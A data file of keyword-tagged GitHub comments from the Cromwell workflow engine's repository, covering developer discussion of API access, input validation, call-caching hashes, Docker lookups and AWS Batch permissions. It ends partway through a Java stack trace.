Security,"@geoffjentry , I misspoke. We are, I believe, using the REST API for all Cromwell info and expect to continue to do that. We will not be accessing the DB directly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1679#issuecomment-262358206:137,access,accessing,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1679#issuecomment-262358206,1,['access'],['accessing']
Security,"@geoffjentry @mcovarr this script doesn't *validate* anything at all, so yeah... The implication of that is, a person currently has to follow along, and make sure that things are happening at appropriate times. The comments are sort-of deliberately scary to encourage that :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2164#issuecomment-293933413:43,validat,validate,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2164#issuecomment-293933413,1,['validat'],['validate']
Security,@geoffjentry @scottfrazer It seems the parser is validating memory runtime attribute entry when it tries to load namespaces.; I think it should be removed to follow the current idea.; This is the link to the code that is causing related test to fail (look for ignore word in the PR) => https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/RuntimeAttributes.scala; Let me know how to proceed with this...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212545369:49,validat,validating,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212545369,1,['validat'],['validating']
Security,"@geoffjentry I did those modifications to runtime attributes memory validation in order to re-use same behavior/code for disk attribute. HtCondor, SGE and TES use same way (data unit) to define disk capacity which is the same way to define memory size as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2141#issuecomment-293009241:68,validat,validation,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2141#issuecomment-293009241,1,['validat'],['validation']
Security,"@geoffjentry I share your concern with adding any sort of syntax to the spec, and my first inclination is to fake support enumeration. Im not exactly sure how to do that though, nor am I sure of whether its possible. The cleanest way I can think of implementing would be maybe something like a Java style enum:. ```; enum MyEnum {; ""A"",""B"",""C""; }. workflow wf {; MyEnum thisIsMyEnum; }; ```. Another way that we would be able to do it would be define an Enum type in a workflow like so:. ```; workflow wf {; #This would get overridden at run time, but the value would need to be validated; Enum greeting = [""HELLO"",""GOODBYE""]; or; #Done override anything but validate it; Enum[""HELLO"",""GOODBYE""] greeting; ; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2425#issuecomment-326603028:579,validat,validated,579,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2425#issuecomment-326603028,2,['validat'],"['validate', 'validated']"
Security,"@geoffjentry I think we're saying the same thing. This is what I'm thinking : [link](https://www.lucidchart.com/publicSegments/view/288aace2-3423-4364-a5f6-6eff306e754e/image.png). (Which is exactly what is in the other ""proof of concept"" branch but with a DB Actor instead of Validation Actor btw)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195428179:277,Validat,Validation,277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195428179,1,['Validat'],['Validation']
Security,"@geoffjentry I totally agree with having a singleton actor for load balancing / supervision / monitoring etc.. but I think the actual validation work itself is better handled by a one-shot do-and-die actor than by a singleton actor. I don't think the actor that is responsible for load balancing, error handling etc.. should also be responsible for doing the work it's supervising.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195401589:134,validat,validation,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195401589,1,['validat'],['validation']
Security,"@geoffjentry I'm working on JES unit test cases now... which are the cases validation should fail if entry is not present?; Let's say Docker entry is not provided in RuntimeAttributes, should validation fails in this case for JES?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212170300:75,validat,validation,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212170300,2,['validat'],['validation']
Security,"@geoffjentry In case this is accessible, can you point me to the udocker singularity work you mentioned?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-358310220:29,access,accessible,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-358310220,1,['access'],['accessible']
Security,"@geoffjentry Verbosity is just a small part of that. Making different parts of the code aware of the each other, where avoidable, doesn't seem like a very good idea. If I'm not mistaken, what you're saying (and what I initially implemented) is something like the erstwhile `DataAccess` (which would be the `ServiceRegistoryActor` in the current world). With this, each step (actor) of the workflow had a reference to it and pushed to it independently. Any change to the dataAccess might have required changes to all the classes which were accessing it. Alternatively, if there was just one entity which handled the responsibility of collecting the metadata, by sniffing around the actors without their knowledge, and then pushed to the database, we need only change this entity for any modifications if there were to happen to the data access stuff. I'll try to explain with a very simple (and silly) analogy: (Honestly, couldn't come up with anything better.); Consider a ginormous Octopus (= `ServiceRegistry`) with a black ink on the tips of it's tentacles, with each of it's legs touching upon different rooms (= classes) in a house. If someday we decide to replace that octopus with something else, we'll be needing to wipe that ink from all the rooms upon which it was standing. On the other hand, if it were to sit and cuddle up just in a single room, there's simply less and comparatively easy work to do to wipe that up. It's simply the same idea here. The Metadata producing entities in the engine can just go about minding their own business, while a third party (those classes with some weird names currently [CromwellProfilerFsm and WorkflowProfilerActor]) handle what they are meant to do: Profile a given workflow execution. (all the while without explicitly telling those execution engine entities that it's reading it's state and data information). If the intentions are still not clear, let's talk about it tomorrow in the meeting to make progress with this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218970121:539,access,accessing,539,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218970121,4,['access'],"['access', 'accessing']"
Security,"@geoffjentry as a part of your spec-ing of CromIAm, we'd like to add to the Role vs. Permission chart on [this page in confluence](https://broadinstitute.atlassian.net/wiki/display/GAWB/Workspace+Access+Control+-+User+experience), with the FireCloud roles and what actions they can take in Cromwell. We'd like you (and @cjllanwarne) to add the Cromwell actions, and Tiffany and I can help with deciding what roles have permission to do the actions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2127#issuecomment-291577666:196,Access,Access,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2127#issuecomment-291577666,1,['Access'],['Access']
Security,"@geoffjentry asked me to clarify, so here I am!. Currently, PAPI doesn't understand FOFN... so they are really just a File that contains strings. Often they are created by taking the file output of a scatter call as an array and writing it to an array like. ```; Array[File] vcfs = PreviousTask.output ...; File fofn = write_lines(vcfs); ```. Then that FOFN is used as the parameter to the task, and used by the tool in the command directly. The only thing that gets localized by PAPI is the FOFN itself. Keep in mind right now that the only scenario where this works is where your docker has access to the file, which on Google means when you're running in service account mode, but hopefully we can overcome that in the future. Just for context, my use case here is more like 'resume' than call caching. I don't expect to find results from some previous/other run of the pipeline. It's really that something broke, I tweaked the WDL, and now want to basically pick up where I left off. That's the specific problem I have (and any methods developer will have with a FOFN step). There are two ways I can think of going about this:. 1. Fix call caching to handle FOFNs specifically. This is tricky I think, but is most robust. In this case, I want Cromwell to understand a File of File references as a specific type but just for call caching purposes. 2. Change call caching to re-use files rather than copying, thus the path of the file doesn't changes, the FOFN doesn't change, and the call cache hits. This is how I ended up working around this by splitting the WDL into pieces where I supply the inputs to avoid the cache-miss step. I believe we have this option in the SFS?. In your proposal @cjllanwarne a FileRef would be hashed like a file for job avoidance, but treated like a string for all other purposes (e.g. passing to PAPI, etc)? I think that could work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901:593,access,access,593,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901,4,"['access', 'hash']","['access', 'hashed']"
Security,@geoffjentry exposing the labels in the metadata looks like it will work great. No need to expose the workflow meta object at this point,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2421#issuecomment-313702938:91,expose,expose,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2421#issuecomment-313702938,1,['expose'],['expose']
Security,@geoffjentry how much effort would it be to include the last modified date in the hash? ; @meganshand do you still want this feature? Or have you found a workaround?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1843#issuecomment-330608524:82,hash,hash,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1843#issuecomment-330608524,1,['hash'],['hash']
Security,"@geoffjentry if the use case is really intended for validation criteria on objects which the user sets, I feel the same as you, that this is an abstraction that should not be handled withing wdl/cromwell. . While I understand the use case (we also have toyed around with the idea of this as a feature request) it adds unnecessary boundaries to object types that should be handled at the level of execution and not job submition. . I think what might be of use in these instances, for users (like myself) is using the parameter meta more efficiently to define in writing what constitutes valid entries. . Going back to the idea of objects as typed key Value pairs, I still think this is a valid idea, that has real use cases and purposes. In many cases data must be paired with other corresponding datasets and values. In a scatter operation having these types of structured objects would greatly simplify how we can group data together",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2283#issuecomment-330323656:52,validat,validation,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2283#issuecomment-330323656,2,['validat'],['validation']
Security,@geoffjentry is it appropriate to hash the url itself for caching purposes for this stage?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-395994554:34,hash,hash,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-395994554,1,['hash'],['hash']
Security,"@geoffjentry yes. My current deployment is v42. If you have access to the GATK forums, i put more details in my post there: https://gatkforums.broadinstitute.org/wdl/discussion/24268/aws-batch-randomly-fails-when-running-multiple-workflows/p1?new=1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-514937738:60,access,access,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-514937738,1,['access'],['access']
Security,"@geoffjentry, thanks for the answer :); Actually, we tried to do something similar to how it was done in GCP (or TES) but it didn't work out. We added logging to the `mapCommandLineWomFile` method so that we can see what `womFiles` Cromwell passes to this method. And it turns out Cromwell never passes ""ad hoc"" files to this method, therefore `asAdHocFile`, for example, always returns `None`. In particular, in our integration test (PR #5057) it passes only two womFiles with values something like ; `s3://bucket-name/cromwell-execution/cwl_temp_file_some-numbers.cwl/some-numbers/call-test`; and; `s3://bucket-name/cromwell-execution/cwl_temp_file_some-numbers.cwl/some-numbers/call-test/tmp.59740063`; I'm not sure, but it looks like the first `womValue` somehow related to the `runtimeEnvironment` field in the `StandardAsyncExecutionActor`. The second value is something else too, since ""ad hoc"" files are placed in `call-test` directory.; It is possible that we misunderstood something, but for now, it looks like a dead-end.; By the way, we also tried to override `localizeAdHocValues` method `AwsBatchAsyncBackendJobExecutionActor` so that it would copy ""ad hoc"" files to the ""/cromwell_root"" directory. It fails with an AccessDeniedException.; I hope this gives you an understanding of why we came to the proposed solutions. As I said, perhaps we misunderstood something, so we will be happy if you can give us some hint.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-509765587:1230,Access,AccessDeniedException,1230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-509765587,1,['Access'],['AccessDeniedException']
Security,"@helgridly ; - Conceptually, this is a list of differences, not a map from known keys to values of interest. Rather, the hashKey is just another piece of information you might be interested in alongside the two calls' hash values.; - I'm keeping the schema well-defined. IMO this will make parsing easier and more precise.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2471#issuecomment-316788346:121,hash,hashKey,121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2471#issuecomment-316788346,2,['hash'],"['hash', 'hashKey']"
Security,"@helgridly @davidangb for context, our understanding is that the absolute worst case here is, ""Cromwell might make a change, meaning that Rawls/Agora won't validate something that Cromwell could run - if only it were to be submitted"". Or alternatively, ""Cromwell will regress and no longer succeed a workflow that Rawls thinks is fine"". Given the slow rate of change in the WDL draft-2 libraries recently, and the (very significant) pain in updating Rawls and Agora every release, that feels like a reasonable position for a few months while we await the switchover to womtool-as-a-service. Are we missing something?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4941#issuecomment-489665477:156,validat,validate,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4941#issuecomment-489665477,1,['validat'],['validate']
Security,"@illusional . A partial hash is a great idea. I am now downloading a 82 GB bam file in order to check the speed of the algorithm, but unfortunately my network connection is a 100mbits on this PC. It will take 2 hours. Even with a 1000mbit perfect connection it would take at least 12 minutes. So computation time is indeed not the limit here. We need to thinks this through though. Some files are more similar at the beginning (VCF headers come to mind) than at the end. So only hashing the beginning carries with it some major concerns. Using the size is indeed a good thing, and I think we should also include the modification time.; In that case `size+modtime+xx64hsum of first 10mb` should create a unique enough identifier for each file while negating any network performance issues. I think this strategy should be called `hpc`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599448301:24,hash,hash,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599448301,2,['hash'],"['hash', 'hashing']"
Security,"@illusional Ah interesting. That makes sense, we made some changes to how docker is handled internally which postdate that udocker project (which was a one off proof of concept). . As you intimated this behavior on Cromwell's part ties back to reproducibility, but also the question of ""what happens if a container changes in the middle of a workflow?"". As an example, imagine there is a scatter job of 1000 identical tasks, all calling `ubuntu:latest`. And suppose that after processing 750/1000, `latest` is changed. Since we already were capturing the info for provenance we also decided to lock in a hash throughout a workflow. I have a vague memory that you might be able to disable this behavior but I can't find it at the moment. I'll ask the team tomorrow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454618602:604,hash,hash,604,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454618602,1,['hash'],['hash']
Security,"@illusional Setting `docker.hash-lookup.enabled` to `false` **might** work here in terms of the docker hash translations going on. If it does, it'll come with the caveat that call caching will not work for any container using a floating tag",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454829890:28,hash,hash-lookup,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454829890,2,['hash'],"['hash', 'hash-lookup']"
Security,"@illusional Thanks for this. I have been looking into (but not having time for) an easy option that would disable the hash lookup altogether. Cromwell connecting to quay.io while quay.io is down causes crashes we do not want in production. There is a configuration option for this. So it was easy. Unfortunately the hash lookup is coupled with the call-caching mechanic. No hash, no cache. Which is something to be aware of. I was wondering if the easiest way wouldn't be to have the lookup be a command in the config. Just like `docker_kill` there could be a `docker_lookup_hash`. That way you can override the default with a custom command that returns a string (https://stackoverflow.com/a/39376254). . For example:; ```; $ docker inspect --format='{{index .RepoDigests 0}}' mysql:5.6; mysql@sha256:19a164794d3cef15c9ac44754604fa079adb448f82d40e4b8be8381148c785fa; ```; This does NOT need the internet. Similarly, this would enable hash-lookup for singularity users as well without internet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660994330:118,hash,hash,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660994330,4,['hash'],"['hash', 'hash-lookup']"
Security,"@illusional Thanks! Well, I do not know if you have write access. But I am sure the Cromwell team is happy to know that this PR is approved by other people in the HPC space. As regards to `docker_script`. It seems that `script` is what gets generated from the WDL task, and it works flawlessly. I don't know what `docker_script` does. It seems to be mentioned only in some corners of the code base and it is not mentioned in the container documentation. My guess would be that this is a now obsolete remnant of some design choices that have been made in the past. `script` works and it is used in all the examples on the container page, so let's be consistent and use that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630625499:58,access,access,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630625499,1,['access'],['access']
Security,"@illusional. I renamed the strategy `fingerprint` because I think it can be used in a general case. Also because it is called ""fingerprint"" it does carry with it the sense that it only tests a small part of the file, and is therefore less reliable than a strategy that hashes the entire file. (Even though it should be reliable enough). To build a new jar, check out the [documentation](https://cromwell.readthedocs.io/en/stable/developers/Building/). It is as easy indeed as checking out the branch and running `sbt assembly`. It might take a while though. If you run out of memory I believe sbt has a `-mem` flag to set the memory. @cjllanwarne I fully agree with your comments on the documentation part, so I trimmed the changelog and moved the information to the documentation. I hope the documentation is adequate and well-explained enough.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599539307:269,hash,hashes,269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599539307,1,['hash'],['hashes']
Security,@jdidion I didn't receive an email address from you so I didn't manually add you. You should be able to sign up with a gmail account. Full access sometimes is delayed so you may need to try and log in again later.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510059927:139,access,access,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510059927,1,['access'],['access']
Security,@jdidion I've added you. Let me know if you still need help with access.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510062459:65,access,access,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510062459,1,['access'],['access']
Security,"@jgainerdewar Latest updates [here](https://github.com/broadinstitute/cromwell/pull/7000). Note that the error in the CI build seems to be a test error related to call caching, and way above that in the build spew there were notifications about not having access to `ubuntu:latest`. Not sure if those two observations are related. I also don't know if the build/test failures are related to the fact we haven't merged the latest changes from `develop` into this PR yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995:256,access,access,256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995,1,['access'],['access']
Security,"@jgainerdewar Since I don't have write access to this PR, here are my changes: https://github.com/broadinstitute/cromwell/pull/6997",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1413802403:39,access,access,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1413802403,1,['access'],['access']
Security,"@jmthibault79 One of our standing rules is to never reinvoke an entire jes job for someone w/o their consent (i.e. ""cost them money""). It's possible to wire in some pre-authorization but that should be a cross-PO type conversation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2233#issuecomment-298731424:169,authoriz,authorization,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2233#issuecomment-298731424,1,['authoriz'],['authorization']
Security,"@jsotobroad I haven't run this at scale on JES, but with some small local tests I'm pretty sure that's the reason why scatter collection is so slow with call caching on.; We basically re-compute hashes for all the elements in the array when the shards are collected...; I ran without and with this fix and scatter collection went from ~75ms to ~2ms.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/853#issuecomment-220192170:195,hash,hashes,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/853#issuecomment-220192170,1,['hash'],['hashes']
Security,@katevoss ; I would like to add our use-case for the ability to access an ID of a workflow/subworkflow. Our users want the output of the Cromwell to be copied to their local locations and they complain that they cannot read the directory structure - I agree with them as they are data scientists and they want something useful after the pipeline finishes. As we provide the service we are responsible to provide them with something. An idea was to use [croo](https://github.com/ENCODE-DCC/croo) to achieve this. It is really useful solution but it requires manual intervention and knowledge of the pipeline IDs etc. Thus I though I could split the workflow into root and two sub-workflows: `do-the-job` and `copy-files`. However to achieve this the `copy-files` would need to have an access to the `do-the-job` sub-workflow ID or at least the root workflow ID to query for the metadata. I agree it is not deterministic and it should not be. Such a task cannot be cached too.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-537417825:64,access,access,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-537417825,2,['access'],['access']
Security,"@katevoss IIRC the intended behavior is that submitted files are stored as-is no matter what and then when we pick up the workflow we check to see if everything is valid. However @cjllanwarne noticed that we are actually validating one of the input files at actual submission time which led to two issues: a) there was a reason why we didn't want to do that in the first place, b) there was a suspicion that this could lead to timeouts instead of errors anyways",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328278898:221,validat,validating,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328278898,1,['validat'],['validating']
Security,"@katevoss This one is important. Although I am open to alternatives, I believe that we need a way to set any parameter from the json file -- no matter how deeply buried the parameter is within subworkflows, etc. Having to explicitly expose parameters has become too big a hardship on developers and has now led to a bugfix GATK4 release with another one forthcoming.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2912#issuecomment-363466390:233,expose,expose,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2912#issuecomment-363466390,1,['expose'],['expose']
Security,"@katevoss Without looking at it, I suspect this would be as easy as removing the validation check. I have a feeling we're also checking where we're supposed to be, making this check not only in the wrong location but also superfluous. My vague recollection was that this was added after the fact by a well intentioned do gooder.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328299188:81,validat,validation,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328299188,1,['validat'],['validation']
Security,"@katevoss we can reuse the result even if the original input file is gone, because we record the hash of the file at execution time. That way, even if the old input file is modified, we won't call-cache unless the new input file matches what was used to generate the original result.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560563:97,hash,hash,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560563,1,['hash'],['hash']
Security,"@kbergin `womtool validate` now (technically, next time Cromwell is released) has an optional flag to supply an `inputs.json` to validate against - is that what you meant?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-386009040:18,validat,validate,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-386009040,2,['validat'],['validate']
Security,@kcibul I created tickets related to this and scheduled a meeting on Monday to hash them down.; Let me know if that covers this ticket and if so I'll close it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1820#issuecomment-272209802:79,hash,hash,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1820#issuecomment-272209802,1,['hash'],['hash']
Security,"@kcibul with the 20k genomes complete, would you say slow hashing is still a problem?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1623#issuecomment-325658884:58,hash,hashing,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1623#issuecomment-325658884,1,['hash'],['hashing']
Security,"@kmavrommatis - Curious how your AWS Batch environment was setup. Did you use the Cfn templates provided [here](https://docs.opendata.aws/genomics-workflows/aws-batch/configure-aws-batch-cfn/), or build it manually?. It is important that the job instance profile associated with the compute environment has the correct access permissions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542#issuecomment-454188024:319,access,access,319,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542#issuecomment-454188024,1,['access'],['access']
Security,@knoblett I replied directly to the forum post. . This is already part of Cromwell (FC actually duplicates us!). The user needs to start up Cromwell in server mode and can then access the timing diagram at:; ```; http://<HOST>:<PORT>/api/workflows/v1/<WORKFLOWID>/timing; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2179#issuecomment-296784331:177,access,access,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2179#issuecomment-296784331,1,['access'],['access']
Security,"@kshakir is this a dupe of the Docker hashing work that is already completed? If so, I'll close it out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-286154588:38,hash,hashing,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-286154588,1,['hash'],['hashing']
Security,"@kshakir the 'where should stuff go' convo got clipped. Looking at your links, one could make an argument that the wdl should go in `src/it` (which still doesn't answer the question of the encrypted travis file). I don't really care where they go, so if you do just tell me where to stick 'em otherwise i'll leave them in src/main/resources",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1050#issuecomment-228136691:189,encrypt,encrypted,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1050#issuecomment-228136691,1,['encrypt'],['encrypted']
Security,"@kshakir, thank you for your detailed explanation. If you do not mind, could you please shed some light on the one more thing.; I have a little bit messy with the definition of what the default credentials are.; Does it mean that the credentials, which Travis and Jenkins use, are default credentials and the purpose of this task is to set other ones and check that four tests were successfully passed? In my point of view, it looks insecure to pass my keys and AWS environments for CI testing. This is why I think that I missed something. Also, in case if I suggest a fix for this task I will not be able to check the results of CI testing by myself cause I do not have access to the Jenkins. Is it possible to get access in read-only mode or I can communicate with someone who can provide testing results?. Thank you in advance for your answers!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-504776413:671,access,access,671,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-504776413,2,['access'],['access']
Security,@lbergelson the issue has been fixed. Let me know if you still aren’t able to access our backlog.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502078996:78,access,access,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502078996,1,['access'],['access']
Security,"@matthewghgriffiths did it work with `\cromwell_mount` or `\cromwell_root`. I'm getting a very similar error, and I've double checked that I had ""cromwell_root"" as listed [here](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/#custom-ami-with-cromwell-additions). I created my AMI today, and I definitely have read / write access from my EC2 instance. I also can't see any Cromwell-execution folders in the bucket, but I do see the cromwell-workflow-logs on my EC2 instance. I created the AMI with the cromwell type, and I've checked that my IAM profile has access to the execution and storage bucket, and confirmed this in the CLI. . ```; Caused by: java.io.IOException: Could not read from s3://<bucket-name>/cromwell-execution/gatkRecalNormal/df58d76a-c3fe-4fb7-94c6-f4bd9ad1d5de/call-gatkBaseRecalibrator/gatkBaseRecalibrator-rc.txt: s3://s3.amazonaws.com/<bucket-name>/cromwell-execution/gatkRecalNormal/df58d76a-c3fe-4fb7-94c6-f4bd9ad1d5de/call-gatkBaseRecalibrator/gatkBaseRecalibrator-rc.txt; 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:146); 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:145); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at scala.util.Failure.recoverWith(Try.scala:232); 	at cromwell.engine.io.nio.NioFlow.withReader(NioFlow.scala:145); 	at cromwell.engine.io.nio.NioFlow.limitFileContent(NioFlow.scala:154); 	at cromwell.engine.io.nio.NioFlow.$anonfun$readAsString$1(NioFlow.scala:98); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:336); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:357); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:303); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at 